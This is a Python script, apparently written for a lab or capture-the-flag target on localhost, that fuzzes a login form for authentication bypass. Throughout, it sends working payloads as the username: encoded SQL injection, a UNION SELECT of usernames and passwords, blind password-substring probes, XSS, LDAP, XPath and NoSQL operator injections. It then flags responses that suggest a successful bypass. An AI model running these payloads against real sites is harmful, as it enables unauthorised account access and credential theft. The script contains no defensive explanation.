import requests
import time
import urllib.parse

base_url = "http://127.0.0.1:33001"
login_url = f"{base_url}/login.php"

# More advanced payloads
payloads_advanced = {
    "encoded_sqli": [
        ("admin%27%20OR%20%271%27%3D%271", "URL encoded basic OR"),
        ("admin%27%20AND%20%271%27%3D%271%23", "URL encoded with # comment"),
        ("admin%27--%20-", "URL encoded comment"),
    ],
    "case_variations": [
        ("AdMiN'--", "Mixed case admin"),
        ("ADMIN'--", "Uppercase admin"),
        ("Admin' OR '1'='1'--", "Mixed case OR"),
    ],
    "double_encoding": [
        ("admin%2527%2520OR%2520%25271%2527%253D%25271", "Double URL encoded"),
    ],
    "unicode_bypasses": [
        ("admin\u0027--", "Unicode apostrophe u0027"),
        ("admin' OR 1=1--", "Standard with OR 1=1"),
        ("admin') OR ('1'='1", "Parenthesis bypass"),
    ],
    "mysql_specific": [
        ("admin'/*!50000AND*/1=1--", "MySQL comment bypass"),
        ("admin'+AND+1=1#", "Plus encoded spaces"),
        ("admin'/**/AND/**/'1'='1", "Comment as spaces"),
    ],
    "alternative_syntax": [
        ("1' AND 1=1 UNION SELECT null,username,password FROM users--", "Union select"),
        ("admin' AND LENGTH(password)>0--", "Boolean blind length check"),
        ("admin' AND SUBSTRING(password,1,1)='a'--", "Boolean blind substring"),
    ],
    "xss_style": [
        ("<script>alert(1)</script>", "XSS attempt"),
        ("' onclick='alert(1)", "Event handler"),
    ],
    "ldap_injection": [
        ("*)(uid=*))((uid=*", "LDAP wildcard"),
        ("admin)(&)", "LDAP bypass"),
    ],
    "xpath_injection": [
        ("' or '1' = '1' or ''='", "XPath OR"),
        ("'] | //* | //*['", "XPath union"),
    ],
}

# Additional tests with different headers/content types
headers_variants = [
    {'Content-Type': 'application/x-www-form-urlencoded'},
    {'Content-Type': 'application/json'},
    {'Content-Type': 'text/plain'},
]

print("ADVANCED AUTHENTICATION BYPASS TESTING")
print("=" * 80)
print(f"Target: {login_url}")
print()

all_results = []
anomalies = []

# Establish baseline
baseline = None
resp = requests.post(login_url, data={'username': 'test', 'password': 'test'}, headers=headers_variants[0])
baseline = {'status': resp.status_code, 'length': len(resp.text), 'has_incorrect': 'incorrect' in resp.text.lower()}
print(f"[BASELINE] Status: {baseline['status']} | Length: {baseline['length']} | Has 'incorrect': {baseline['has_incorrect']}")
print()

for category, payload_list in payloads_advanced.items():
    print(f"[{category.upper()}]")
    
    for payload, description in payload_list:
        result = {'category': category, 'description': description, 'payload': payload}
        
        # Test with form encoding (default)
        try:
            resp = requests.post(
                login_url, 
                data={'username': payload, 'password': 'test'},
                headers=headers_variants[0],
                timeout=5
            )
            
            result['status'] = resp.status_code
            result['length'] = len(resp.text)
            result['has_incorrect'] = 'incorrect' in resp.text.lower() or 'error' in resp.text.lower()
            result['cookies'] = dict(resp.cookies)
            result['redirect'] = resp.headers.get('Location', '')
            result['response_snippet'] = resp.text[:200].replace('\n', ' ')
            
            # Check for anomalies
            anomaly_reasons = []
            if result['status'] != baseline['status']:
                anomaly_reasons.append(f"Status change: {baseline['status']} -> {result['status']}")
            if abs(result['length'] - baseline['length']) > 50:
                anomaly_reasons.append(f"Length diff: {abs(result['length'] - baseline['length'])}B")
            if result['has_incorrect'] != baseline['has_incorrect']:
                anomaly_reasons.append("Incorrect msg changed")
            if result['cookies']:
                anomaly_reasons.append(f"Cookies: {result['cookies']}")
            if result['redirect']:
                anomaly_reasons.append(f"Redirect: {result['redirect']}")
                
            if anomaly_reasons:
                result['anomaly_reasons'] = anomaly_reasons
                anomalies.append(result)
                print(f"  [!] ANOMALY: {description}")
                for reason in anomaly_reasons:
                    print(f"      -> {reason}")
            else:
                print(f"  [OK] {description}")
                
        except Exception as e:
            result['error'] = str(e)
            print(f"  [ERR] {description}: {e}")
            
        all_results.append(result)
        time.sleep(0.05)

# Try JSON payloads with JSON content-type
print("\n[JSON PAYLOAD TESTS]")
json_payloads = [
    {'username': {'$ne': None}, 'password': {'$ne': None}},
    {'username': {'$eq': 'admin'}, 'password': {'$gt': ''}},
    {'username': {'$regex': 'admin'}, 'password': {'$exists': True}},
]

for i, json_payload in enumerate(json_payloads):
    try:
        resp = requests.post(
            login_url,
            json=json_payload,
            headers={'Content-Type': 'application/json'},
            timeout=5
        )
        print(f"  JSON Payload {i+1}: {resp.status_code} | Length: {len(resp.text)}B")
        
        if 'incorrect' not in resp.text.lower() or resp.status_code != 200:
            print(f"    [!] ANOMALY: Status={resp.status_code}, Has incorrect={'incorrect' in resp.text.lower()}")
            print(f"    Response: {resp.text[:200]}")
    except Exception as e:
        print(f"  JSON Payload {i+1}: Error - {e}")

print("\n" + "=" * 80)
print("ANOMALY SUMMARY")
print("=" * 80)
if anomalies:
    for i, a in enumerate(anomalies, 1):
        print(f"\n[{i}] Category: {a['category']}")
        print(f"    Description: {a['description']}")
        print(f"    Payload: {a['payload']}")
        print(f"    Status: {a['status']} | Length: {a['length']}")
        print(f"    Reasons: {', '.join(a['anomaly_reasons'])}")
else:
    print("No anomalies detected in advanced testing.")

print("\n" + "=" * 80)
print("RESPONSE ANALYSIS")
print("=" * 80)

# Get full response from baseline to understand the error message
resp = requests.post(login_url, data={'username': 'test', 'password': 'test'})
print(f"\nFull response for failed login:")
print(f"Status: {resp.status_code}")
print(f"Headers: {dict(resp.headers)}")
print(f"Body:\n{resp.text}")

